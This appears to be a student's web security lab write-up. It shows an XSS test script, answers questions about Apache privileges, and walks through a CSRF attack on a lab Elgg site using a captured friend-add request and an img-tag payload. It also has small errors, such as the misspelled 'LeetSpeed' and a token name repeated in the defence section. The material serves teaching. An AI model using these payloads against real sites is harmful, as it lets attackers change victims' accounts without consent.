# Lab4

## Part2

my attack is:

```php+HTML
<h3> Hi there </h3>
<script> alert(1); </script>
<p id="demo"></p>
<script>
let url = document.URL;
document.getElementById("demo").innerHTML = url;
</script>
```

1: First, I use "h3" tags are used to test whether input can be displayed correctly

2: I use "script" tag (the first script) which contains an alert() function. It aims to display a warning box with the number 1 when the page loads.

3: I use "p" tag which contains "id = 'demo'". This element will be used to display the current page's URL in the second script. And then the second "script" tag uses this element. It like this: 

```
let url = document.URL; 
document.getElementById("demo").innerHTML = url;
```

This script sets a JavaScript variable url and assigns the current page's URL to it. Then, this URL will be displayed inside the paragraph element with the ID "demo."

## Part3

### 1

**What was the web server you attacked. Was it a recent version of the web server? What are the market shares of the top 3 web servers in the world?**

I choose my machine's website. And it's Apache2, version 2.4.41. Now the newest version of Apache HTTP Server is 2.4.46.

And I got the market shares from https://www.wappalyzer.com/technologies/web-servers/. 1st is Nginx. 2nd is Apache. 3rd is LeetSpeed.

### 2

**Why are you (a normal unix user) not able to start a web server on port 80? What is the security issue?**

In the default setting of Linux, only the root user has permission to occupy ports below 1024. Therefore, when using programs such as Tomcat, Apache, Nginx, etc., if you want to bind to port 80 with a regular user, it will throw a "BindException: Permission denied" exception.

This is a security measure to prevent regular users from accidentally or maliciously running services that could interfere with critical system operations.

### 3

**Why is the web server running as www-data, and not as the user root? What is the security issue?**

If it run as the user root, it would grant the web server the highest level of access to the system. If the web server were compromised, an attacker could potentially gain control over the entire system with root privileges, and he can do almost anything. Therefore, the web server should run as a less privileged user, such as "www-data".

## Part4

### Task 2

env:

* download `Labsetup.zip`

* `vim /etc/hosts`

```
10.9.0.5        www.seed-server.com
10.9.0.5        www.example32.com
10.9.0.105      www.attacker32.com
```

* unzip, docker-compose

```
docker-compose up -d
docker-compose up
```

Visit http://www.seed-server.com/members and found that there are five people.

> Task 2: 
>
> In this task, we need two people in the Elgg social network: Alice
> and Samy. Samy wants to become a friend to Alice, but Alice refuses to add him to her Elgg friend list. Samy decides to use the CSRF attack to achieve his goal. He sends Alice an URL (via an email or a posting in Elgg); Alice, curious about it, clicks on the URL, which leads her to Samy's web site:  www.attacker32.com} Pretend that you are Samy, describe how you can construct the content of the web page, so as soon as Alice visits the web page, Samy is added to the friend list of Alice (assuming Alice has an
> active session with Elgg).

First, we use Boby's account to add Alice. Username is Boby and password is seedboby. After login, we add Alice. We can see the GET request (from HTTP Header Live).

```
http://www.seed-server.com/action/friends/add?friend=56&__elgg_ts=1689588471&__elgg_token=6iOEQgAffiRc9Ui3rnJ08g&__elgg_ts=1689588472&__elgg_token=bj1G9ivWI7YTeTGbarbr6A
```

```
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.seed-server.com/profile/alice
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Cookie: caf_ipaddr=10.116.88.101; country=; city=""; traffic_target=gd; __gsas=ID=d2eb40f7be510466:T=1689584140:RT=1689584140:S=ALNI_MaU8Ok4TDeo2rL0m4z-cCSpFwzUlg; pvisitor=bfd63f60-a12b-4408-8e29-2935b22ff7dd; Elgg=bpp201b7rsqej57ikh0alhiepf
```

![image-20230717181107124](https://github.com/LyrisLaurier/notes/assets/94295495/f2357957-f54b-45b2-b0fb-d6eab24b3553)


So, we can get that Alice's friend id is 56. Use the same method, we can get Samy's freind id is 59.

Then, we add a blog. And write: `<img src="http://www.seed-server.com/action/friends/add?friend=59">`. Save it! Or we can use "Embed content" -> "Link", get a title, and set the url "http://www.seed-server.com/action/friends/add?friend=59".

After that, we log out, login Alice,and we can find this blog.If Alice click this img, she will add Samy!

![image-20230717182458429](https://github.com/LyrisLaurier/notes/assets/94295495/19540c6e-822d-4534-9069-405b431331a2)


### How to defense

We can check their cookie.For example, we can use these two variable: `__elgg_ts` and `__elgg_ts`.

And we can also check its HTTP Referer.

